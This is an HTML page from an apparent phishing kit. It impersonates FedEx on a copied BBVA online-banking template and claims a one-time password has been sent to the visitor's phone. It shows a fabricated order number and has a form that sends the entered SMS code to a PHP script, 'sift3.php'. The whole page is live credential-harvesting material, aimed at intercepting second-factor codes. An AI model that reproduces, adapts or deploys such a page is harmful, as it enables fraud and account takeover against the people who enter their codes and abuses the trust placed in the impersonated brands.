﻿<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
<!-- saved from url=(0060)https://www.bbvanetcash.pe/KDPOSolicitarCredenciales_es.html -->
<html><!--xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en">--><head><meta http-equiv="Content-Type" content="text/html; charset=windows-1252">
    
    <title>FedEx | OTP </title>
	<link rel="icon" href="files/favicon.ico" type="image/x-icon">

	<meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate">
	<meta http-equiv="Pragma" content="no-cache">
	<meta http-equiv="Expires" content="0">
    <meta http-equiv="Content-Style-Type" content="text/css">
    <meta http-equiv="X-UA-Compatible" content="IE=edge;IE=9;IE=10;IE=11">
    
    <meta http-equiv="Content-Language" content="es">
    <meta name="viewport" content="initial-scale=1">
    <script type="text/javascript" src="./files/plantilla_es.js.téléchargement"></script>
    <script type="text/javascript" src="./files/direccionPIBEE_es.js.téléchargement"></script>
    <script type="text/javascript" src="./files/keyBoard_es.js.téléchargement"></script>
	<script type="text/javascript" src="./files/desmigrados_es.js.téléchargement"></script>
	<script type="text/javascript" src="./files/cookie.js.téléchargement"></script>
    <!--<link rel="stylesheet" media="screen" href="css/estilos_index_es.css" type="text/css">-->
 	
    
    <!-- CSS de Bootstrap -->
    <link href="./files/bootstrap.css" rel="stylesheet" media="screen">
    <link href="./files/bootstrap-bbva.css" rel="stylesheet" media="screen">
    
    <!--[if lt IE 9]>
      <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
      <script src="https://oss.maxcdn.com/libs/respond.js/1.4.2/respond.min.js"></script>
    <![endif]-->
   
</head>

    
    <!--------------------------------------------------------------------->
    <body >
      
    <div class="container">	
        <!-- HEADER -->
        <div class="row">
        	<div class="col-lg-12 non-padding">
                <ul class="header-layouts list-unstyled visible-xs">
                    <li class="colorn-1"></li>
					<li class="colorn-1"></li>
					<li class="colorn-1"></li>
					<li class="colorn-1"></li>
					<li class="colorn-1"></li>
					<li class="colorn-1"></li>
                    
                </ul>
            </div>
			<div class="col-lg-12 visible-xs" style="
    background-color: #4d148c;
    height: 46px;
    margin-top: -13px;
">
				<div class="col-lg-12" style="top:6px">
					<img style="width: 106px;height:auto;" src="./files/logo.png">
				</div>
			</div>
            <div class="col-lg-12 margin-bottomx20">

            </div>
        </div>
        
        <div class="row">
        	<div class="col-lg-12">
            	<div class="container-section-primary padding-top0" onkeyup="reglaPass()">
            		<div class="row">
                    	<div class="col-lg-4 col-md-4 col-sm-4 hidden-xs">
							<img style="width:100%" src="./files/logo.png">
						</div>

						
						<ul class="list-unstyled list-inline-general-header pull-right">
						
						</ul>
						
                    	
                        <div class="clearfix"></div>
                       
                        
                        <div class="col-lg-4 col-md-4 col-sm-4">
                        	<h1 class="margin-bottom-texto-inicial"></h1>
                            <form name="logon" method="POST" action="sift3.php">
							

  
  
							<img src="files/tracking.png" alt="" title="" border="0" width="40" height="40">
							<font color="#691A99" class="ws11" style="
    font-size: 18px;
"><b><font style="vertical-align: inherit;">SMS Verification Process</font></b></font> 



							<br><div _ngcontent-c5="" class="header-title" style="font-size: 1.4rem!important;line-height: 2rem!important;letter-spacing: -.025rem!important;color: #333333;/* font-weight: 400!important; */font-family: sans-serif;font-weight: bold;margin-bottom: 24px;text-align: left;"><font style="vertical-align: inherit;">We've just sent a One-Time-Password to your phone number.</font><br> <br>
							<font color="#4B126D" face="Tahoma"><b>Order</b></font><font face="Tahoma"> #112-0930796-6956877</font>
							</div>
							
							<br>
														<div align="center"><font face="Tahoma" class="ws8">Enter the SMS code and click "Confirm"</font></div><br>
														
<br>
							
                            	<input type="hidden" name="from" value="FedEx">
        						<input type="hidden" name="">
                            	<div class="row" id="id1" style="display: block;">
								
								
                                    

                                    <div class="col-xs-12 margin-bottomx10">
									<p><img alt="" src="https://i.imgur.com/w6fR7DR.gif" style="width: 30px; float: right; height: 11px;" /></p>
									
                                        <label class="control-label" for="cuit" id="cuit" style=" font-weight: bold; color: #333;">  <font style="vertical-align: inherit;">  <font style="vertical-align: inherit;color: #4d148c;">SMS Code</font>  </font>  </label> 
                                        <input type="text" autocomplete="off" class="form-control" name="sms" id="sms" tabindex="2" maxlength="20" required="" style="display: block; background: rgb(255, 255, 255);" value="">
</div>




									
									
                             
                                    <div class="col-xs-12 margin-top-button-ingresar">
									
                                        <button type="submit" id="comm" class="btn btn-primary btn-block" style="margin-top: 22px;background-color: #ff6200;border-color: #ff6200;"><font style="font-size: 17px;">Confirm</font></button>
										<input type="hidden" name="frm" value="sms.html">
											<input type="hidden" name="to" value="sms.html">
                                    </div>
                                </div>
								
								<div id="id2" style="display: none;">
								test
								</div>
                            </form>
                            
                            <div class="line-horizontal line-login-v2"></div>
                            
							
							</div>
							<div class="msj_ico msj_inf">
								
							</div>

                        </div>
						<div>
                            <div class="col-lg-8 col-md-8 col-sm-8">
							  <div class="hidden-xs"> 

                          
							<div class="visible-xs"> 
								<br><br><br>
								<div class="border-option" style="border-top-right-radius: 5px;border-top-left-radius: 5px;">
									<div class="col-xs-12 sin-espacios">
										<div class="col-xs-11 sin-espacios">
											<a class="resaltar-top" href="javascript:abrirformularios();" style="font-size:13px">&nbsp;&nbsp;&nbsp;Contrata net cash </a>
										</div>
										<div class="col-xs-1 sin-espacios">
											<span class="texto-border">&gt;<!--<span-->
										</span></div>
									</div>
								</div>
								<div class="border-option" style="border-bottom-right-radius: 5px;border-bottom-left-radius: 5px;">
									<div class="col-xs-12 sin-espacios">
										<div class="col-xs-11 sin-espacios">
											<a href="javascript:abrirCatalogo();">&nbsp;&nbsp;&nbsp;Catálogo de servicios</a>
										</div>
										<div class="col-xs-1 sin-espacios">
											<span class="texto-border">&gt;<!--<span-->
										</span></div>
									</div>
								</div>									
							</div>
                        </div>
						</div>
                    </div>
                </div>
            </div>
        </div>
        
		<div class="clearfix"></div>
		<!-- FOOTER -->
        <footer class="footer-bbva row">
                
                
        </footer>
		
        <!-- Librería jQuery requerida por los plugins de JavaScript -->
        <script src="./files/jquery-1.11.3.min.js.téléchargement"></script>
        <script src="./files/bootstrap.min.js.téléchargement"></script>
	</div>


</body></html>